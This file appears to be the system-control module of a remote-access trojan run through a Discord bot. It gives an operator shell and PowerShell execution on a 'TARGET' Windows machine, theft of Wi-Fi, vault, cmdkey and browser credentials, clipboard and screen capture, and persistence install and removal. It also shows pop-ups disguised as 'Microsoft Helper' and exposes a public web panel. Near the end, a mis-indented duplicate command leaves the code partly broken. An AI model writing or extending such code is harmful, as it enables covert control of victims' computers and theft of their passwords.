import asyncio
import io
import json as _j
import os
import sys

import discord
from discord.ext import commands

from core import capture, collect, creds, notify, persist, util, web
from core.util import code, human, run, run_ps, say


def io_buf(b):
    return io.BytesIO(b)


class System(commands.Cog):
    """System, shell, power, inventory, persistence."""

    def __init__(self, bot):
        self.bot = bot

    # ------------------------------------------------------------ core
    @commands.command()
    async def ping(self, ctx):
        await say(ctx.channel, f'`{round(self.bot.latency * 1000)}ms`')

    @commands.command()
    async def info(self, ctx):
        a, disks, procs = await asyncio.to_thread(collect.gather)
        e = discord.Embed(title='TARGET', color=0x2b2d31, timestamp=discord.utils.utcnow())
        for k, v in a[:12]:
            e.add_field(name=k, value=f'`{v}`'[:1020], inline=True)
        e.add_field(name='Disks', value='```' + '\n'.join(disks)[:1000] + '```', inline=False)
        await ctx.channel.send(embed=e)
        await ctx.channel.send(embed=discord.Embed(
            title='Top processes', description='```' + '\n'.join(procs) + '```', color=0x2b2d31))
        await ctx.channel.send(file=discord.File(
            io_buf(await asyncio.to_thread(capture.STREAM.snap_bytes)), 'screen.png'))

    # ------------------------------------------------------------ exec
    @commands.command(aliases=['sh', 'cmd'])
    async def shell(self, ctx, *, cmd: str):
        async with ctx.typing():
            await code(ctx.channel, await asyncio.to_thread(run, cmd, util.CWD['path'], 180))

    @commands.command()
    async def ps(self, ctx, *, script: str):
        async with ctx.typing():
            await code(ctx.channel, await asyncio.to_thread(run_ps, script, 90))

    @commands.command()
    async def cd(self, ctx, *, path: str):
        p = os.path.abspath(os.path.join(util.CWD['path'], path))
        if not os.path.exists(p):
            return await say(ctx.channel, 'no such path')
        util.CWD['path'] = p if os.path.isdir(p) else os.path.dirname(p)
        await say(ctx.channel, f'`{util.CWD["path"]}`')

    @commands.command()
    async def pwd(self, ctx):
        await say(ctx.channel, f'`{util.CWD["path"]}`')

    # ------------------------------------------------------------ processes
    @commands.command()
    async def procs(self, ctx):
        import psutil
        rows = []
        for p in sorted(psutil.process_iter(['pid', 'name', 'memory_info']),
                        key=lambda x: x.info['memory_info'].rss if x.info['memory_info'] else 0,
                        reverse=True)[:60]:
            m = p.info['memory_info']
            rows.append(f'{p.info["pid"]:>6} {human(m.rss if m else 0):>10} {p.info["name"]}')
        await code(ctx.channel, '\n'.join(rows))

    @commands.command()
    async def kill(self, ctx, pid: int):
        await say(ctx.channel, await asyncio.to_thread(
            run_ps, f'Stop-Process -Id {pid} -Force; "ok"'))

    # ------------------------------------------------------------ info
    @commands.command()
    async def env(self, ctx):
        await code(ctx.channel, '\n'.join(f'{k}={v}' for k, v in sorted(os.environ.items())))

    @commands.command()
    async def av(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'try{Get-MpComputerStatus|Select AMServiceEnabled,RealTimeProtectionEnabled,'
            'AntivirusEnabled|fl|Out-String}catch{"n/a"}'))

    @commands.command()
    async def wifi(self, ctx):
        for w in await asyncio.to_thread(creds.wifi):
            await say(ctx.channel, f'`{w["ssid"]}` : `{w["key"] or "(open)"}`')

    @commands.command()
    async def netpass(self, ctx):
        c = await asyncio.to_thread(creds.all_creds)
        for w in c['wifi']:
            await say(ctx.channel, f'`{w["ssid"]}` : `{w["key"] or "(open)"}`')
        if c['cmdkey']:
            await code(ctx.channel, 'CMDKEY\n' + '\n'.join(x['target'] for x in c['cmdkey']))
        if c['vault']:
            await code(ctx.channel, '\n'.join(c['vault']))
        if c['browser']:
            await code(ctx.channel, c['browser'][:3800])

    @commands.command()
    async def clip(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps, 'Get-Clipboard -Raw'))

    @commands.command()
    async def clipset(self, ctx, *, text: str):
        await asyncio.to_thread(run_ps, f'Set-Clipboard -Value "{text}"')
        await say(ctx.channel, 'set')

    @commands.command()
    async def msg(self, ctx, *, text: str):
        await asyncio.to_thread(run_ps,
            'Add-Type -AssemblyName PresentationFramework;'
            f'[System.Windows.MessageBox]::Show("{text}","Microsoft Helper")|Out-Null')
        await say(ctx.channel, 'shown')

    @commands.command()
    async def toast(self, ctx, *, text: str):
        await asyncio.to_thread(run_ps,
            'Add-Type -AssemblyName System.Windows.Forms;'
            '$n=New-Object System.Windows.Forms.NotifyIcon;'
            '$n.Icon=[System.Drawing.SystemIcons]::Information;$n.Visible=$true;'
            f'$n.ShowBalloonTip(5000,"Microsoft Helper","{text}",0)')
        await say(ctx.channel, 'sent')

    @commands.command()
    async def speak(self, ctx, *, text: str):
        await asyncio.to_thread(run_ps,
            'Add-Type -AssemblyName System.Speech;'
            f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{text}")')
        await say(ctx.channel, 'spoken')

    @commands.command()
    async def open(self, ctx, *, target: str):
        await asyncio.to_thread(run, f'start "" "{target}"')
        await say(ctx.channel, 'opened')

    @commands.command()
    async def wallpaper(self, ctx, *, path: str):
        await asyncio.to_thread(run_ps,
            f'Set-ItemProperty "HKCU:\\Control Panel\\Desktop" Wallpaper "{path}";'
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern int '
            f'SystemParametersInfo(int a,int b,string c,int d);\' -Name S -Namespace W;'
            f'[W.S]::SystemParametersInfo(20,0,"{path}",3)')
        await say(ctx.channel, 'set')

    @commands.command()
    async def volume(self, ctx, val: str):
        from ctypes import POINTER, cast

        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        try:
            d = AudioUtilities.GetSpeakers()
            v = (d.EndpointVolume if hasattr(d, 'EndpointVolume')
                 else cast(d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None),
                           POINTER(IAudioEndpointVolume)))
            if val == 'mute':
                v.SetMute(not v.GetMute(), None)
                return await say(ctx.channel, 'toggled')
            v.SetMasterVolumeLevelScalar(max(0, min(100, int(val))) / 100, None)
            await say(ctx.channel, f'{val}%')
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    # ------------------------------------------------------------ power
    @commands.command()
    async def lock(self, ctx):
        await asyncio.to_thread(run, 'rundll32.exe user32.dll,LockWorkStation')
        await say(ctx.channel, 'locked')

    @commands.command()
    async def sleep(self, ctx):
        await asyncio.to_thread(run, 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
        await say(ctx.channel, 'sleeping')

    @commands.command()
    async def monitor_off(self, ctx):
        await asyncio.to_thread(run_ps,
            'Add-Type -MemberDefinition \'[DllImport("user32.dll")]public static extern int '
            'SendMessage(int h,int m,int w,int l);\' -Name S -Namespace W;'
            '[W.S]::SendMessage(0xFFFF,0x0112,0xF170,2)')
        await say(ctx.channel, 'off')

    @commands.command()
    async def shutdown(self, ctx):
        await asyncio.to_thread(run, 'shutdown /s /t 5')
        await say(ctx.channel, 'bye')

    @commands.command()
    async def restart(self, ctx):
        await asyncio.to_thread(run, 'shutdown /r /t 5')
        await say(ctx.channel, 'rebooting')

    @commands.command()
    async def logoff(self, ctx):
        await asyncio.to_thread(run, 'shutdown /l')
        await say(ctx.channel, 'logged off')

    # ------------------------------------------------------------ inventory
    @commands.command()
    async def startup(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-CimInstance Win32_StartupCommand|Select Name,Command,Location|fl|Out-String -Width 300'))

    @commands.command()
    async def services(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-Service|Where Status -eq Running|Select -First 60 Name,DisplayName'
            '|ft -AutoSize|Out-String -Width 200'))

    @commands.command()
    async def scheduled(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-ScheduledTask|Where State -ne Disabled|Select TaskName,State'
            '|ft -AutoSize|Out-String -Width 200'))

    @commands.command()
    async def users(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-LocalUser|Select Name,Enabled,LastLogon|ft -AutoSize|Out-String'))

    @commands.command()
    async def admins(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run, 'net localgroup administrators'))

    @commands.command()
    async def installed(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,'
            'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
            '|Where DisplayName|Select DisplayName|Out-String -Width 200'))

    @commands.command()
    async def patches(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-HotFix|Select HotFixID,InstalledOn|ft -AutoSize|Out-String'))

    @commands.command()
    async def productkey(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            '(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey'))

    @commands.command()
    async def serials(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Get-CimInstance Win32_BIOS|Select SerialNumber;'
            'Get-CimInstance Win32_BaseBoard|Select SerialNumber'))

    @commands.command()
    async def bitlocker(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps, 'manage-bde -status'))

    @commands.command()
    async def geo(self, ctx):
        try:
            import requests
            r = requests.get('http://ip-api.com/json', timeout=5).json()
            await code(ctx.channel, '\n'.join(
                f'{k}: {v}' for k, v in r.items()
                if k in ('country', 'regionName', 'city', 'zip', 'lat', 'lon',
                         'isp', 'org', 'as', 'timezone')))
        except Exception as e:
            await say(ctx.channel, f'failed: {e}')

    @commands.command()
    async def hosts(self, ctx):
        await code(ctx.channel, open(r'C:\Windows\System32\drivers\etc\hosts').read())

    @commands.command()
    async def idle(self, ctx):
        await code(ctx.channel, await asyncio.to_thread(run_ps,
            'Add-Type -AssemblyName System.Windows.Forms;'
            '[System.Windows.Forms.SystemInformation]::IdleTime.TotalSeconds'))

    @commands.command()
    async def battery(self, ctx):
        import psutil
        b = psutil.sensors_battery()
        if not b:
            return await say(ctx.channel, 'no battery')
        await say(ctx.channel, f'{b.percent}% {"plugged" if b.power_plugged else "on battery"}')

    # ------------------------------------------------------------ panel
    @commands.command()
    async def panel(self, ctx, action: str = 'start'):
        """start | stop | url — public web panel"""
        if action == 'stop':
            await web.stop()
            await notify.down('stopped')
            return await say(ctx.channel, 'panel stopped')

        if action == 'url':
            u = web.URL or web.lan_url()
            return await say(ctx.channel, f'{u}/?k={self.bot.cfg["web_token"]}'
                             if u else 'not running')

        url = await notify.ensure_panel(self.bot, self.bot.cfg, 'panel')
        await say(ctx.channel, f'**PANEL** {url}' if url else 'panel failed')

    # ------------------------------------------------------------ persistence
    @commands.command()
    async def persist(self, ctx):
        await say(ctx.channel, f'installed → `{await asyncio.to_thread(persist.install)}`')
    
    @commands.command()
    async def pstatus(self, ctx):
        await code(ctx.channel, _j.dumps(await asyncio.to_thread(persist.status), indent=2))

    @commands.command()
    async def uninstall(self, ctx):
        await asyncio.to_thread(persist.uninstall)
        await say(ctx.channel, 'removed, exiting')
        await asyncio.sleep(1.5)
        await self.bot.close()

    @commands.command(name='exit')
    async def _exit(self, ctx):
        await say(ctx.channel, 'closing')
        await asyncio.sleep(1)
        await self.bot.close()

@commands.command(aliases=['panel', 'stream'])
    async def web(self, ctx, action: str = 'on'):
        """on | off | url — web panel (starts only when you ask)"""
        if action == 'off':
            await web.stop()
            await notify.down('stopped by user')
            return await say(ctx.channel, 'panel off')

        if action == 'url':
            u = web.current_url()
            if not u:
                return await say(ctx.channel, 'panel is off — send `!web`')
            return await say(ctx.channel, f'{u}  ·  via `{web.provider() or "lan"}`')

        if web.running():
            return await say(ctx.channel, f'already on · {web.current_url()}')

        url = await notify.ensure_panel(self.bot, self.bot.cfg, 'panel')
        if url:
            await say(ctx.channel, f'**PANEL** {url}  ·  via `{web.provider() or "lan"}`')
        else:
            await say(ctx.channel, 'panel failed — check `!web url` or try another tunnel')

    @commands.command()
    async def reexec(self, ctx):
        await say(ctx.channel, 'restarting')
        os.execv(sys.executable, [sys.executable] + sys.argv)


async def setup(bot):
    await bot.add_cog(System(bot))